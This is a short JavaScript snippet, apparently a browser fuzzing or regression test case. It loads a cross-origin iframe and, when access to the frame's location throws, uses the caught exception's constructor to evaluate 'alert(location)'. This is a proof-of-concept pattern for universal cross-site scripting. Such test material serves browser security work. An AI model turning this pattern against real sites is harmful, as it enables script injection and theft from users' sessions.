try {
    let v2;
    try { v2 = document.createElement("iframe"); } catch (e) {}
    const v3 = document?.documentElement;
    let v4;
    try { v4 = v3.appendChild(v2); } catch (e) {}
    var i = v4;
    function f6() {
        try {
            const v9 = frames?.[0]?.location;
            try { Object.observe(v9, Map, 0); } catch (e) {}
        } catch(e14) {
            const v16 = e14?.constructor;
            let v17;
            try { v17 = v16.constructor("alert(location)"); } catch (e) {}
            try { v17(); } catch (e) {}
        }
    }
    i.onload = f6;
    i.src = "https://abc.xyz";
} catch(e20) {
}
